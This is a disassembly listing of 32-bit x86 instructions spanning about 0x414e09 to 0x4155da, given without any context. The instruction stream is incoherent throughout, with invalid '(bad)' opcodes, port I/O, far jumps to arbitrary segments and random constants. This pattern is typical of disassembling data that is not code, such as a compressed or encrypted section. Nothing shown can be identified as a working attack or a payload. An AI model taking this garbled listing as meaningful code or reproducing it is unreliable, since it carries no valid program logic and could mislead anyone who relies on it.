  414e09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e0a:	aam    0x3d
  414e0c:	mov    cl,0xd1
  414e0e:	mov    dh,bh
  414e10:	sbb    DWORD PTR [ebx+0x3af7fab4],0xfffffff8
  414e17:	in     eax,dx
  414e18:	inc    ecx
  414e19:	test   eax,0x13aa6b37
  414e1e:	cmp    BYTE PTR [edi+0x72746b10],dh
  414e24:	cwde   
  414e25:	inc    ebp
  414e26:	pop    edx
  414e27:	cmp    edi,DWORD PTR [edx-0x7b8e3fc6]
  414e2d:	clc    
  414e2e:	fadd   QWORD PTR [ebx]
  414e30:	xchg   esi,eax
  414e31:	inc    esp
  414e32:	jnp    0x414dd7
  414e34:	(bad)
  414e38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e39:	ror    edx,1
  414e3b:	lds    ebp,FWORD PTR [esi]
  414e3d:	dec    esp
  414e3e:	call   0x3524e1eb
  414e43:	or     bh,bh
  414e45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e46:	call   0x77d8c3d
  414e4b:	xor    cl,ch
  414e4d:	icebp  
  414e4e:	adc    eax,0x61d4b4f2
  414e53:	sub    ch,BYTE PTR [eax]
  414e55:	mov    eax,0x27ffceaa
  414e5a:	mov    cl,0xc4
  414e5c:	std    
  414e5d:	int3   
  414e5e:	push   ss
  414e5f:	cmp    al,0xf5
  414e61:	lea    ecx,[edx-0x22]
  414e64:	mov    ecx,0xb24b83b9
  414e69:	inc    esp
  414e6a:	jnp    0x414ebb
  414e6c:	xchg   esp,eax
  414e6d:	inc    eax
  414e6e:	add    BYTE PTR [ecx],bl
  414e70:	rcl    DWORD PTR [ebp+0x67],cl
  414e73:	inc    edi
  414e74:	cmp    edx,DWORD PTR [edx]
  414e76:	dec    esp
  414e77:	mov    esp,gs
  414e79:	cmp    eax,0x77e2ec2a
  414e7e:	jmp    0xb2d7429c
  414e83:	pop    DWORD PTR ds:0x25fd95bc
  414e89:	dec    ecx
  414e8a:	dec    eax
  414e8b:	push   cs
  414e8c:	dec    ecx
  414e8d:	aam    0x2f
  414e8f:	or     BYTE PTR [esi+0x1f],bl
  414e92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e93:	stos   BYTE PTR es:[edi],al
  414e94:	xchg   DWORD PTR [ecx],ecx
  414e96:	dec    edi
  414e97:	and    dh,BYTE PTR [ebp-0x56]
  414e9a:	add    ah,ah
  414e9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e9d:	xchg   esi,eax
  414e9e:	push   ebx
  414e9f:	add    BYTE PTR [ebp-0x56],cl
  414ea2:	pop    ebx
  414ea3:	into   
  414ea4:	out    0x53,eax
  414ea6:	fs ins BYTE PTR es:[edi],dx
  414ea8:	shl    BYTE PTR [ebx+edi*1-0x6c],0xa7
  414ead:	and    dl,BYTE PTR [eax+esi*4]
  414eb0:	xchg   edi,eax
  414eb1:	popf   
  414eb2:	scas   eax,DWORD PTR es:[edi]
  414eb3:	mov    al,0x2a
  414eb5:	pop    ds
  414eb6:	dec    edx
  414eb7:	in     al,dx
  414eb8:	jle    0x414f21
  414eba:	push   ebx
  414ebb:	cdq    
  414ebc:	dec    esi
  414ebd:	jo     0x414e94
  414ebf:	leave  
  414ec0:	fyl2x  
  414ec2:	and    eax,0x9baadf4d
  414ec7:	pusha  
  414ec8:	push   edx
  414ec9:	or     ebx,DWORD PTR [esi]
  414ecb:	rcl    DWORD PTR [ecx-0x5f],1
  414ece:	inc    esp
  414ecf:	cmp    eax,0x870cb72b
  414ed4:	inc    edx
  414ed5:	mov    ebp,0x7eefba00
  414eda:	or     DWORD PTR [edx],ebp
  414edc:	lea    ebx,cs:[esi-0x37]
  414ee0:	in     al,dx
  414ee1:	mov    edi,0x977c651b
  414ee6:	add    ecx,eax
  414ee8:	pusha  
  414ee9:	jns    0x414e74
  414eeb:	cld    
  414eec:	push   eax
  414eed:	push   ecx
  414eee:	push   ecx
  414eef:	cmc    
  414ef0:	cmp    edx,DWORD PTR [eax]
  414ef2:	imul   edx,DWORD PTR [ebx+edx*8],0x9f8c8920
  414ef9:	or     ebx,DWORD PTR [eax]
  414efb:	xor    eax,0x24175541
  414f00:	out    0x69,eax
  414f02:	mov    cs,WORD PTR [ecx+ebp*2+0x78cbff43]
  414f09:	mov    ah,BYTE PTR [ebx]
  414f0b:	sub    al,0x58
  414f0d:	jnp    0x414f87
  414f0f:	mov    ds:0xade2b94b,al
  414f14:	push   es
  414f15:	sub    DWORD PTR [eax-0x19],esi
  414f18:	or     al,0x8a
  414f1a:	jp     0x414f50
  414f1c:	gs jnp 0x414ef4
  414f1f:	test   DWORD PTR [ecx],0xd0bb67df
  414f25:	add    dx,WORD PTR es:[eax+0x657a87d]
  414f2d:	icebp  
  414f2e:	bound  edi,QWORD PTR [eax+ebx*8+0x31590f4c]
  414f35:	add    ah,BYTE PTR [ecx+0x22]
  414f38:	jmp    0x414f7b
  414f3a:	and    cl,BYTE PTR [bx+0x2dd2]
  414f3f:	mov    bh,0xcc
  414f41:	dec    eax
  414f42:	nop
  414f43:	sub    ecx,ebp
  414f45:	xor    BYTE PTR ds:0x17504e29,al
  414f4b:	or     al,0x5
  414f4d:	clc    
  414f4e:	push   0x4
  414f50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f51:	retf   0x88ce
  414f54:	cmp    eax,0xa5fea553
  414f59:	jp     0x414ee8
  414f5b:	shr    DWORD PTR [esi-0x45],0x4d
  414f5f:	out    dx,al
  414f60:	iret   
  414f61:	inc    edi
  414f62:	cmp    DWORD PTR ds:0x50415cc5,ebp
  414f68:	and    al,0x4e
  414f6a:	imul   eax,ebp,0x1325cc5
  414f70:	cmp    al,0x4e
  414f72:	sbb    eax,0xd549a229
  414f77:	dec    edx
  414f78:	call   0x7ce3c85c
  414f7d:	std    
  414f7e:	fmul   DWORD PTR ss:[esi-0xd]
  414f82:	mov    cl,bl
  414f84:	xor    ebp,DWORD PTR [ecx+0x7f]
  414f87:	pop    esi
  414f88:	jl     0x414f29
  414f8a:	int3   
  414f8b:	rcr    DWORD PTR [edi],0x3f
  414f8e:	sahf   
  414f8f:	popf   
  414f90:	nop
  414f91:	loop   0x414f74
  414f93:	push   0x5e
  414f95:	or     eax,0xf5b1e70b
  414f9a:	repnz sbb edx,ebp
  414f9d:	push   ss
  414f9e:	aad    0x99
  414fa0:	imul   esi,DWORD PTR [edx+0x380e70fe],0xcce942f7
  414faa:	jmp    0x414fb0
  414fac:	mov    dh,BYTE PTR ds:0xc6fbfe1e
  414fb2:	and    DWORD PTR [edx],ecx
  414fb4:	repz shr DWORD PTR [ebp+0x2f50d7dc],cl
  414fbb:	push   ds
  414fbc:	xor    DWORD PTR [ecx-0x45f2593d],ebp
  414fc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fc3:	ss cmp bl,ch
  414fc6:	cmp    edi,ecx
  414fc8:	pop    esp
  414fc9:	rcl    DWORD PTR [eax],1
  414fcb:	int3   
  414fcc:	out    dx,al
  414fcd:	mov    ebx,0xc5e5c89f
  414fd2:	cmp    edi,ebp
  414fd4:	xchg   esp,eax
  414fd5:	jb     0x41500e
  414fd7:	xor    ch,ah
  414fd9:	xchg   ecx,eax
  414fda:	adc    al,0x7e
  414fdc:	add    BYTE PTR [ebx+0x0],al
  414fdf:	adc    ecx,eax
  414fe1:	jo     0x414fa7
  414fe3:	ret    
  414fe4:	push   edx
  414fe5:	mov    ah,0x85
  414fe7:	iret   
  414fe8:	test   BYTE PTR [eax-0x28],dl
  414feb:	sub    ah,bl
  414fed:	inc    eax
  414fee:	scas   al,BYTE PTR es:[edi]
  414fef:	sbb    eax,0xf5381720
  414ff4:	dec    edi
  414ff5:	fucom  st(2)
  414ff7:	push   esi
  414ff8:	jecxz  0x414f8d
  414ffa:	and    eax,DWORD PTR [ebp+0x3e]
  414ffd:	and    ch,BYTE PTR [eax+ecx*2+0x75]
  415001:	fstp   TBYTE PTR [eax+0x6c]
  415004:	loopne 0x414ff0
  415006:	inc    edx
  415007:	addr16 in eax,0xc8
  41500a:	dec    ebp
  41500b:	test   BYTE PTR [ebx-0x3c],al
  41500e:	icebp  
  41500f:	dec    esi
  415010:	mov    bl,0x80
  415012:	mov    al,ds:0x639c3806
  415017:	cld    
  415018:	mov    cl,0xe6
  41501a:	mov    ebx,0x6680fe55
  41501f:	jecxz  0x414faa
  415021:	arpl   WORD PTR [eax+esi*1],cx
  415024:	mov    eax,?
  415026:	cmp    DWORD PTR [ebp-0xe],0x9876c1d2
  41502d:	sub    BYTE PTR [ebx],ah
  41502f:	nop
  415030:	add    al,BYTE PTR [esi+0x50]
  415033:	mov    al,0x8b
  415035:	mov    ah,0x3c
  415037:	mov    ds:0xd03b042b,eax
  41503c:	xchg   esp,eax
  41503d:	loop   0x41504d
  41503f:	mov    edi,0xbc879b22
  415044:	xchg   ebx,eax
  415045:	mov    dh,0x3b
  415047:	xor    DWORD PTR [edx-0x6bddd548],edx
  41504d:	pop    eax
  41504e:	jecxz  0x414fef
  415050:	loop   0x414ff4
  415052:	jmp    0x32a37935
  415057:	aad    0x29
  415059:	mov    edi,DWORD PTR [esi]
  41505b:	or     edx,edx
  41505d:	test   eax,0x1bbc0433
  415062:	(bad)  
  415063:	xchg   esi,eax
  415064:	sbb    ecx,DWORD PTR [esi-0x72846aa3]
  41506a:	pop    esp
  41506b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41506c:	pop    esp
  41506d:	pusha  
  41506e:	leave  
  41506f:	inc    eax
  415070:	mov    bl,0x35
  415072:	mov    ds:0xa1c59eb9,al
  415077:	pop    ecx
  415078:	js     0x4150b2
  41507a:	ret    
  41507b:	xor    dh,0x65
  41507e:	sbb    bh,BYTE PTR [esi-0x4b834f9e]
  415084:	pusha  
  415085:	mov    edi,0x6aada258
  41508a:	jmp    0xbc2e2f62
  41508f:	jmp    0x356b:0xd51d0e63
  415096:	ins    DWORD PTR es:[edi],dx
  415097:	mov    ebx,0xb17ab5a9
  41509c:	js     0x41506f
  41509e:	pop    esp
  41509f:	jns    0x415037
  4150a1:	jle    0x4150fe
  4150a3:	loope  0x4150e3
  4150a5:	fisub  WORD PTR [esi+0x5e]
  4150a8:	or     al,0x51
  4150aa:	mov    al,ds:0x19690f60
  4150af:	or     ecx,DWORD PTR [eax-0x76]
  4150b2:	jge    0x41504e
  4150b4:	fisubr DWORD PTR [eax]
  4150b6:	rol    DWORD PTR [esi+0x3d35db8],0x28
  4150bd:	cmp    ebx,ebp
  4150bf:	pushf  
  4150c0:	stos   BYTE PTR es:[edi],al
  4150c1:	loopne 0x415120
  4150c3:	sahf   
  4150c4:	mov    edi,0xf5f5028
  4150c9:	inc    edx
  4150ca:	mov    edi,0xa436c38
  4150cf:	xchg   dh,dh
  4150d1:	das    
  4150d2:	jbe    0x4150a5
  4150d4:	mov    ebx,DWORD PTR [ecx+esi*4]
  4150d7:	test   DWORD PTR [esi-0x73],ecx
  4150da:	sbb    bl,ch
  4150dc:	test   DWORD PTR [eax-0x5b],0x7b29d665
  4150e3:	cwde   
  4150e4:	add    ah,dl
  4150e6:	neg    BYTE PTR [ebp+0x61]
  4150e9:	fcmovne st,st(0)
  4150eb:	jne    0x4150cb
  4150ed:	mov    eax,ds:0x89e8e704
  4150f2:	add    al,0x6d
  4150f4:	fsubr  DWORD PTR [esp+eiz*8-0x7c]
  4150f8:	sub    BYTE PTR [eax+0xf],0x35
  4150fc:	jae    0x4150ee
  4150fe:	sub    esi,DWORD PTR [ecx+0x2e]
  415101:	jmp    0x286c:0xfe705e2a
  415108:	cmp    DWORD PTR [esi],ebp
  41510a:	sub    BYTE PTR [esi-0x133bfa2f],dh
  415110:	(bad)  
  415111:	mov    ebx,0x67c86e4f
  415116:	or     al,0x3f
  415118:	imul   eax,DWORD PTR [ebx+0x4c],0x96c510a3
  41511f:	out    0x65,eax
  415121:	add    eax,DWORD PTR [eax]
  415123:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415124:	push   cs
  415125:	or     al,0x93
  415127:	popf   
  415128:	cmp    BYTE PTR [esi+0x1dbfd8de],bl
  41512e:	jbe    0x415183
  415130:	push   ss
  415131:	xchg   DWORD PTR [edx-0x22a1a035],eax
  415137:	jae    0x4150e9
  415139:	lods   eax,DWORD PTR ds:[esi]
  41513a:	fisttp WORD PTR [ecx+0x0]
  41513d:	data16 fwait
  41513f:	inc    ebp
  415140:	iret   
  415141:	ds stc 
  415143:	lock or BYTE PTR [ebp+0x392bce2c],0xc8
  41514b:	adc    eax,0x6f86beb0
  415150:	test   eax,0x1726829f
  415155:	dec    ecx
  415156:	sbb    al,0x96
  415158:	inc    esp
  415159:	stos   DWORD PTR es:[edi],eax
  41515a:	aad    0x8f
  41515c:	add    esp,edx
  41515e:	into   
  41515f:	lea    edi,[edi+0x52]
  415162:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415163:	nop
  415164:	pop    es
  415165:	(bad)  
  415168:	(bad)  
  415169:	sub    eax,0x49aa6c97
  41516e:	sbb    edi,ebx
  415170:	js     0x4151c5
  415172:	add    dl,BYTE PTR ss:[edx]
  415175:	sub    ebx,0x21
  415178:	jnp    0x415146
  41517a:	outs   dx,BYTE PTR ds:[esi]
  41517b:	dec    esi
  41517c:	in     al,0x43
  41517e:	lea    ebx,[esi-0x32801a81]
  415184:	jg     0x4151df
  415186:	lods   al,BYTE PTR ds:[esi]
  415187:	cmp    bh,BYTE PTR [edx-0x7427d4cf]
  41518d:	jb     0x41520e
  41518f:	mov    dh,0x2d
  415191:	daa    
  415192:	sub    al,0x95
  415194:	dec    edi
  415195:	pop    ebp
  415196:	scas   eax,DWORD PTR es:[edi]
  415197:	out    dx,eax
  415198:	cmp    DWORD PTR [esi-0x7b0534a],esp
  41519e:	mov    dl,0xbe
  4151a0:	in     eax,0xea
  4151a2:	fdivr  DWORD PTR ss:[ebx]
  4151a5:	inc    esi
  4151a6:	dec    ebx
  4151a7:	push   ebp
  4151a8:	cld    
  4151a9:	and    DWORD PTR [ecx],esi
  4151ab:	push   0x1
  4151ad:	std    
  4151ae:	xchg   esp,eax
  4151af:	pop    edx
  4151b0:	sub    BYTE PTR [esi-0x6a52dd7d],dl
  4151b6:	or     DWORD PTR [esi-0x56a31c43],esp
  4151bc:	aas    
  4151bd:	aaa    
  4151be:	mov    dh,0x69
  4151c0:	push   es
  4151c1:	mov    eax,DWORD PTR [ecx-0x5a39f0e]
  4151c7:	cld    
  4151c8:	aad    0xdc
  4151ca:	pusha  
  4151cb:	mov    eax,ds:0x1fa2b684
  4151d0:	mov    cl,0x75
  4151d2:	mov    al,ds:0xf800f6a9
  4151d7:	dec    esi
  4151d8:	rol    dh,0xc5
  4151db:	sbb    BYTE PTR [edi-0x7cf6e567],0xb2
  4151e2:	adc    cl,BYTE PTR [ebx+0x69]
  4151e5:	mov    DWORD PTR cs:[ecx-0x7a],edx
  4151e9:	call   0xda4b:0x4aaef59a
  4151f0:	xor    cl,BYTE PTR [eax-0x77]
  4151f3:	xchg   esi,eax
  4151f4:	pop    esp
  4151f5:	mov    dh,0x3d
  4151f7:	mov    dh,0x61
  4151f9:	mov    ebp,0xa12de07d
  4151fe:	fwait
  4151ff:	aam    0x7a
  415201:	xchg   ecx,eax
  415202:	enter  0x98e7,0xda
  415206:	sbb    ecx,DWORD PTR [ebx+ecx*8+0xc0570ad]
  41520d:	jecxz  0x41523a
  41520f:	sbb    bl,0x6e
  415212:	jg     0x415242
  415214:	mov    esp,0xd57eeefe
  415219:	ja     0x415272
  41521b:	bound  edi,QWORD PTR [edx+ecx*1-0x43]
  41521f:	mov    esi,esp
  415221:	imul   ebp,DWORD PTR [edx-0x148bf061],0x5de33f1f
  41522b:	ins    BYTE PTR es:[edi],dx
  41522c:	ins    DWORD PTR es:[edi],dx
  41522d:	mov    BYTE PTR [esi-0x5],bh
  415230:	jmp    0x415227
  415232:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415233:	outs   dx,DWORD PTR ds:[esi]
  415234:	cld    
  415235:	sbb    esi,DWORD PTR [ecx+0x90b0a48]
  41523b:	adc    eax,0xe55a2d1
  415240:	mov    cl,0xff
  415242:	int    0x97
  415244:	daa    
  415245:	or     DWORD PTR [ebp-0x40f2ef93],edx
  41524b:	cwde   
  41524c:	inc    ebp
  41524d:	stos   BYTE PTR es:[edi],al
  41524e:	or     bl,BYTE PTR [eax+0x276f2215]
  415254:	(bad)  
  415255:	jecxz  0x415287
  415257:	lds    esi,FWORD PTR [esi-0x4f56d2c4]
  41525d:	or     DWORD PTR [ecx],ecx
  41525f:	out    0x40,al
  415261:	clc    
  415262:	mov    esi,0x4f7a7e2f
  415267:	cmp    eax,ecx
  415269:	xor    al,BYTE PTR [edi-0x6753603e]
  41526f:	rcr    DWORD PTR [edi+ebp*8],cl
  415272:	xchg   esp,eax
  415273:	es adc eax,0x1f1ccc1c
  415279:	and    al,0xb
  41527b:	push   cs
  41527c:	mov    ah,BYTE PTR [ebx]
  41527e:	jmp    0xb5ef:0xee94eb29
  415285:	push   ss
  415286:	adc    ah,BYTE PTR [ebx+ebx*1]
  415289:	shr    BYTE PTR [edx],cl
  41528b:	aaa    
  41528c:	mov    al,0x1f
  41528e:	test   BYTE PTR [edi-0x14],bl
  415291:	xor    eax,DWORD PTR [ecx]
  415293:	test   al,0x4
  415295:	int3   
  415296:	push   eax
  415297:	inc    esi
  415298:	xor    DWORD PTR [ebx+0x356912c6],ebx
  41529e:	xchg   edi,eax
  41529f:	sar    BYTE PTR [eax],0x95
  4152a2:	and    dh,ah
  4152a4:	ret    
  4152a5:	mov    eax,DWORD PTR [esi]
  4152a7:	adc    edx,ecx
  4152a9:	mov    ebx,0x2f7de29e
  4152ae:	mov    edx,0xeabab95d
  4152b3:	(bad)  
  4152b4:	adc    DWORD PTR [ecx+ecx*8+0x6f22caf9],edx
  4152bb:	ret    0x2a50
  4152be:	ss arpl bp,ax
  4152c1:	enter  0x84f7,0xa3
  4152c5:	retf   0xdd7b
  4152c8:	rcl    BYTE PTR [edi],0x26
  4152cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152cc:	std    
  4152cd:	rcl    dh,1
  4152cf:	test   DWORD PTR [ecx],ebx
  4152d1:	cli    
  4152d2:	(bad)  [esi+0x0]
  4152d5:	xchg   edi,eax
  4152d6:	not    DWORD PTR [ebp+0xbaa2409]
  4152dc:	and    al,BYTE PTR [esi+0x8]
  4152df:	adc    bl,bl
  4152e1:	sahf   
  4152e2:	call   0xb45e:0x1f4a5efa
  4152e9:	pop    ebp
  4152ea:	into   
  4152eb:	addr16 dec ebp
  4152ed:	mov    ebx,0xd448658d
  4152f2:	ins    BYTE PTR es:[edi],dx
  4152f3:	popa   
  4152f4:	call   0x6f511ca2
  4152f9:	sbb    eax,0xf2cb707e
  4152fe:	fs or  ah,0x41
  415302:	fild   WORD PTR [eax-0x6a]
  415305:	mov    BYTE PTR [ebp+0x9e3b88b],bh
  41530b:	call   0x748b:0x82fb59da
  415312:	adc    ebx,DWORD PTR [esp+ecx*4]
  415315:	leave  
  415316:	inc    ecx
  415317:	pop    esp
  415318:	sub    al,0xe4
  41531a:	les    edi,FWORD PTR [edi]
  41531c:	sbb    al,0x28
  41531e:	imul   esp,DWORD PTR [esi+0x6a],0xffffffbd
  415322:	inc    edi
  415323:	jnp    0x415325
  415325:	dec    ecx
  415326:	add    edx,DWORD PTR [eax+0x8089b9d]
  41532c:	leave  
  41532d:	arpl   WORD PTR [esi],cx
  41532f:	inc    ebp
  415330:	test   DWORD PTR [ebx+0x65],edx
  415333:	rol    ecx,cl
  415335:	nop
  415336:	push   0xba006120
  41533b:	dec    ebp
  41533c:	std    
  41533d:	xchg   ebx,eax
  41533e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41533f:	add    ebx,eax
  415341:	sub    eax,0xa523c862
  415346:	shl    eax,0x76
  415349:	sub    eax,0xbf10e0c7
  41534e:	dec    edi
  41534f:	mov    ds:0xde9d344b,al
  415354:	rcl    DWORD PTR [ebp+0x37],cl
  415357:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415358:	pop    ebp
  415359:	cmp    eax,ebx
  41535b:	push   0x3c
  41535d:	sub    eax,0x186c1015
  415362:	retf   0x28b6
  415365:	cmp    esi,DWORD PTR [ecx+ebx*1+0x3197566c]
  41536c:	push   esi
  41536d:	dec    esp
  41536e:	jmp    0xe8597930
  415373:	jno    0x415359
  415375:	lea    esp,[edx*8-0x1f36cb36]
  41537c:	mov    WORD PTR [edi+edx*1+0x78ae6851],ds
  415383:	jns    0x415326
  415385:	out    0x1f,al
  415387:	call   0xd6e2ce73
  41538c:	scas   al,BYTE PTR es:[edi]
  41538d:	stos   BYTE PTR es:[edi],al
  41538e:	inc    edi
  41538f:	push   0xab652da0
  415394:	(bad)  
  415396:	jne    0x41539c
  415398:	inc    esp
  415399:	rcl    BYTE PTR [ebp+0x715fc0c7],cl
  41539f:	outs   dx,DWORD PTR ds:[esi]
  4153a0:	xchg   ebp,eax
  4153a1:	cdq    
  4153a2:	adc    BYTE PTR [ecx+edx*4+0x7fdf1fca],dh
  4153a9:	add    eax,0xc3eb8ad9
  4153ae:	fwait
  4153af:	loopne 0x4153bd
  4153b1:	adc    bh,dl
  4153b3:	jae    0x415356
  4153b5:	stos   BYTE PTR es:[edi],al
  4153b6:	mov    ch,0x29
  4153b8:	sbb    cl,dl
  4153ba:	ret    0x2938
  4153bd:	mov    esp,0xded87f08
  4153c2:	(bad)  
  4153c3:	aas    
  4153c4:	pushf  
  4153c5:	mov    bh,bl
  4153c7:	stos   BYTE PTR es:[edi],al
  4153c8:	ret    
  4153c9:	jmp    0xcf19:0x8b01
  4153cf:	je     0x415386
  4153d1:	xor    edi,esi
  4153d3:	jecxz  0x4153aa
  4153d5:	sub    BYTE PTR [ecx-0x34e611e7],bh
  4153db:	mov    edx,0xc4973be
  4153e0:	xor    al,0xd9
  4153e2:	clc    
  4153e3:	cs cmp eax,0x411e51b6
  4153e9:	arpl   WORD PTR [edx-0x28],si
  4153ec:	leave  
  4153ed:	xchg   ecx,eax
  4153ee:	pop    esi
  4153ef:	into   
  4153f0:	or     ebx,DWORD PTR [edi+0x55fef717]
  4153f6:	jb     0x41539a
  4153f8:	ret    0x6378
  4153fb:	add    al,0xfc
  4153fd:	cmp    al,0x36
  4153ff:	out    dx,eax
  415400:	cmp    BYTE PTR [ebp+0xc],al
  415403:	jmp    0x415424
  415405:	push   edx
  415406:	gs scas al,BYTE PTR es:[edi]
  415408:	test   al,0xe5
  41540a:	inc    eax
  41540b:	pop    ds
  41540c:	je     0x4153d3
  41540e:	jmp    0xe525cf99
  415413:	fwait
  415414:	adc    BYTE PTR [ecx+0x585ffcb9],cl
  41541a:	sub    eax,DWORD PTR [eax]
  41541c:	cwde   
  41541d:	push   0x2cfbad92
  415422:	xor    BYTE PTR [eax+esi*4],dh
  415425:	xor    DWORD PTR [ebp+0x2311ad3c],ecx
  41542b:	mov    ebx,0x7380ed77
  415430:	mov    ebp,0xf77e715a
  415435:	cmp    BYTE PTR [ecx-0x74317777],al
  41543b:	lods   al,BYTE PTR ds:[esi]
  41543c:	addr16 jmp 0x27d774b6
  415442:	mov    ds:0x3afdf810,eax
  415447:	test   al,ah
  415449:	xlat   BYTE PTR ds:[ebx]
  41544a:	pop    ds
  41544b:	(bad)  
  41544c:	loopne 0x41547c
  41544e:	add    eax,0x5a7cfe0d
  415453:	cmp    BYTE PTR [edx-0xb],al
  415456:	sub    bh,cl
  415458:	call   0x70fa067a
  41545d:	cmove  ecx,DWORD PTR [esi+0x3b1b3dbd]
  415464:	jmp    0xe974:0x16ccb73f
  41546b:	outs   dx,DWORD PTR ds:[esi]
  41546c:	adc    edi,DWORD PTR [esi-0x11]
  41546f:	inc    ebp
  415470:	sbb    eax,0xa5fceed2
  415475:	scas   eax,DWORD PTR es:[edi]
  415476:	sbb    ebp,ebx
  415478:	xor    DWORD PTR [eax+0x18],esi
  41547b:	popf   
  41547c:	out    0x73,al
  41547e:	sbb    BYTE PTR [eax],cl
  415480:	xor    ah,BYTE PTR [ecx]
  415482:	shl    BYTE PTR [esi],1
  415484:	div    edx
  415486:	out    dx,eax
  415487:	push   ecx
  415488:	or     DWORD PTR [ebp+ecx*4+0xf178557],ecx
  41548f:	lods   al,BYTE PTR ds:[esi]
  415490:	add    ch,al
  415492:	cmc    
  415493:	inc    ecx
  415494:	xchg   esi,eax
  415495:	pop    ecx
  415496:	cmp    esp,esp
  415498:	outs   dx,BYTE PTR ds:[esi]
  415499:	adc    BYTE PTR [ebp-0x4efbb08f],ch
  41549f:	dec    ebp
  4154a0:	cmp    ecx,esp
  4154a2:	mov    bh,0xa3
  4154a4:	add    BYTE PTR [eax],ah
  4154a6:	push   0x73
  4154a8:	or     eax,0x7b7f963
  4154ad:	outs   dx,DWORD PTR ds:[esi]
  4154ae:	hlt    
  4154af:	sub    ah,cl
  4154b1:	retf   
  4154b2:	fld    DWORD PTR [esi]
  4154b4:	and    eax,0xc5904fe9
  4154b9:	shl    BYTE PTR [ebx-0x55],0xd9
  4154bd:	loopne 0x4154ce
  4154bf:	lock dec ebp
  4154c1:	fs push 0xfb8524d7
  4154c7:	ja     0x41548d
  4154c9:	adc    DWORD PTR [ebx-0xd],esi
  4154cc:	xor    al,0x9c
  4154ce:	js     0x41552d
  4154d0:	mov    edx,0x87b5a90c
  4154d5:	xchg   edi,eax
  4154d6:	dec    esi
  4154d7:	lahf   
  4154d8:	call   ebx
  4154da:	outs   dx,DWORD PTR ds:[esi]
  4154db:	push   esi
  4154dc:	inc    ebx
  4154dd:	or     al,0xd3
  4154df:	(bad)
  4154e2:	jb     0x415513
  4154e4:	in     eax,0x83
  4154e6:	clc    
  4154e7:	add    BYTE PTR ds:0xa49dc123,ah
  4154ed:	inc    esp
  4154ee:	mov    edx,0xc432a0e9
  4154f3:	sub    eax,0x7b295e7
  4154f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154f9:	mov    dl,0x46
  4154fb:	pop    edx
  4154fc:	lock imul edx,DWORD PTR [edx-0x54],0x40
  415501:	mov    bl,bh
  415503:	bswap  esi
  415505:	cmp    al,0xcf
  415507:	mov    edi,0xa35181d1
  41550c:	push   ebx
  41550d:	xor    esi,DWORD PTR [edi]
  41550f:	inc    ebx
  415510:	in     eax,0xb2
  415512:	dec    edi
  415513:	popa   
  415514:	pop    edx
  415515:	sbb    eax,0xd31e68ca
  41551a:	sub    bh,BYTE PTR [edi+ebp*2+0x1ece6c7]
  415521:	retf   0xb1ab
  415524:	push   0x22b5dd87
  415529:	(bad)  
  41552a:	retf   
  41552b:	push   esp
  41552c:	sub    al,0xe7
  41552e:	xlat   BYTE PTR ds:[ebx]
  41552f:	jl     0x41558d
  415531:	cmovo  esi,DWORD PTR [eax]
  415534:	cld    
  415535:	xor    al,0xc4
  415537:	(bad)  
  415538:	stos   DWORD PTR es:[edi],eax
  415539:	pusha  
  41553a:	push   ss
  41553b:	nop
  41553c:	jnp    0x4154ea
  41553e:	ds mov bh,0x60
  415541:	push   es
  415542:	gs pop ecx
  415544:	mov    ah,0xc1
  415546:	add    DWORD PTR [ecx-0x68],esi
  415549:	push   edx
  41554a:	daa    
  41554b:	xchg   ebp,eax
  41554c:	sbb    DWORD PTR [esi-0x4b7bb60],0x780323fa
  415556:	xlat   BYTE PTR ds:[ebx]
  415557:	mov    al,0xa5
  415559:	xchg   ebx,eax
  41555a:	leave  
  41555b:	inc    esp
  41555c:	dec    esp
  41555d:	scas   al,BYTE PTR es:[edi]
  41555e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41555f:	bound  edi,QWORD PTR [ebp-0x40]
  415562:	push   ss
  415563:	adc    eax,0x5960efe
  415568:	mov    esp,0xb1817345
  41556d:	in     al,dx
  41556e:	aas    
  41556f:	shl    DWORD PTR [ecx],cl
  415571:	dec    ebp
  415572:	ins    DWORD PTR es:[edi],dx
  415573:	dec    BYTE PTR [ebp+0x26c7ac36]
  415579:	inc    esi
  41557a:	xchg   edx,eax
  41557b:	lods   eax,DWORD PTR ds:[esi]
  41557c:	push   esi
  41557d:	xlat   BYTE PTR ds:[ebx]
  41557e:	pop    es
  41557f:	mov    DWORD PTR [ecx-0x58],ecx
  415582:	idiv   bl
  415584:	lea    esi,es:[ebx-0x4f]
  415588:	sub    DWORD PTR [esi-0x23],ebx
  41558b:	aam    0xef
  41558d:	les    ebp,FWORD PTR [ecx-0x6b]
  415590:	xchg   DWORD PTR [edi+0x39],edi
  415593:	jnp    0x4155b6
  415595:	mov    cl,bh
  415597:	and    al,0x10
  415599:	test   eax,0x7afb6f86
  41559e:	sahf   
  41559f:	mov    DWORD PTR [eax-0x2bfbb23a],ecx
  4155a5:	mov    ?,WORD PTR [eax]
  4155a7:	mov    ch,0xf
  4155a9:	addr16 mov ah,0xc9
  4155ac:	js     0x41557b
  4155ae:	ror    DWORD PTR [esi-0x2a48eff7],1
  4155b4:	xor    DWORD PTR [esi],eax
  4155b6:	mov    al,BYTE PTR [esi+0x55e16502]
  4155bc:	sub    eax,esp
  4155be:	jb     0x41562b
  4155c0:	int    0xec
  4155c2:	ja     0x4155ed
  4155c4:	push   0x2ace5953
  4155c9:	push   ss
  4155ca:	call   0x3056:0x3738c798
  4155d1:	aam    0xfa
  4155d3:	push   esp
  4155d4:	mov    bl,0xf9
  4155d6:	aaa    
  4155d7:	fld    DWORD PTR [edx]
  4155d9:	out    dx,al
  4155da:	or     eax,0x6efff637
